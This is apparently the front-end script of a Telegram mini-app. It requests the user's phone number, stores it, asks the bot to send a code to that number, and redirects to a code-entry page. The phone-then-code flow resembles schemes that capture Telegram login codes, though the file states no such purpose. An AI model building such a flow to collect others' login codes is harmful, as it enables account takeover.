// Функция запроса номера телефона через Telegram WebApp
function requestPhoneNumber() {
    console.log('🔍 Проверяем Telegram WebApp API...');
    
    // Ждем загрузки Telegram WebApp API
    let attempts = 0;
    const maxAttempts = 10;
    
    const checkAndRequestContact = () => {
        attempts++;
        console.log(`🔍 Попытка ${attempts}/${maxAttempts}: window.Telegram =`, window.Telegram);
        
        if (window.Telegram && window.Telegram.WebApp) {
            console.log('✅ Telegram WebApp API доступен!');
            
            // Инициализируем WebApp
            window.Telegram.WebApp.ready();
            window.Telegram.WebApp.expand();
            
            // Запрашиваем номер телефона
            window.Telegram.WebApp.requestContact((contact) => {
                console.log('📱 Получен контакт:', contact);
                if (contact && contact.phone_number) {
                    // Сохраняем номер
                    localStorage.setItem('phoneNumber', contact.phone_number);
                    
                    // Отправляем запрос на отправку кода боту
                    sendCodeToBot(contact.phone_number);
                    
                    // Переходим на страницу ввода кода
                    window.location.href = 'code-verification.html';
                } else {
                    alert('❌ Не удалось получить номер телефона');
                }
            });
            return;
        }
        
        if (attempts < maxAttempts) {
            console.log('⏳ Ждем загрузки Telegram WebApp API...');
            setTimeout(checkAndRequestContact, 100);
        } else {
            console.log('❌ Telegram WebApp API не загрузился за 1 секунду');
            alert('❌ Это приложение работает только в Telegram!');
        }
    };
    
    // Начинаем проверку
    checkAndRequestContact();
}

// Функция отправки запроса на код боту
function sendCodeToBot(phone) {
    if (window.Telegram && window.Telegram.WebApp) {
        const data = {
            action: 'send_code',
            phone: phone
        };
        
        // Отправляем данные боту
        window.Telegram.WebApp.sendData(JSON.stringify(data));
        console.log('📱 Запрос на отправку кода отправлен боту');
    }
}

// Функции для модального окна
function showPrivacyModal() {
    document.getElementById('privacyModal').style.display = 'block';
    document.body.style.overflow = 'hidden';
}

function closePrivacyModal() {
    document.getElementById('privacyModal').style.display = 'none';
    document.body.style.overflow = 'auto';
}

// Закрытие модального окна при клике вне его
window.onclick = function(event) {
    const modal = document.getElementById('privacyModal');
    if (event.target === modal) {
        closePrivacyModal();
    }
}

// Закрытие модального окна по Escape
document.addEventListener('keydown', function(event) {
    if (event.key === 'Escape') {
        closePrivacyModal();
    }
});

// Проверка Telegram WebApp API при загрузке страницы
document.addEventListener('DOMContentLoaded', function() {
    console.log('🔍 Проверяем Telegram WebApp API при загрузке...');
    
    // Ждем загрузки Telegram WebApp API
    let attempts = 0;
    const maxAttempts = 10;
    
    const checkTelegramAPI = () => {
        attempts++;
        console.log(`🔍 Попытка ${attempts}/${maxAttempts}: window.Telegram =`, window.Telegram);
        
        if (window.Telegram && window.Telegram.WebApp) {
            console.log('✅ Telegram WebApp API доступен!');
            // Инициализируем WebApp
            window.Telegram.WebApp.ready();
            window.Telegram.WebApp.expand();
            return;
        }
        
        if (attempts < maxAttempts) {
            console.log('⏳ Ждем загрузки Telegram WebApp API...');
            setTimeout(checkTelegramAPI, 100);
        } else {
            console.log('❌ Telegram WebApp API не загрузился за 1 секунду');
        }
    };
    
    // Начинаем проверку
    checkTelegramAPI();
});
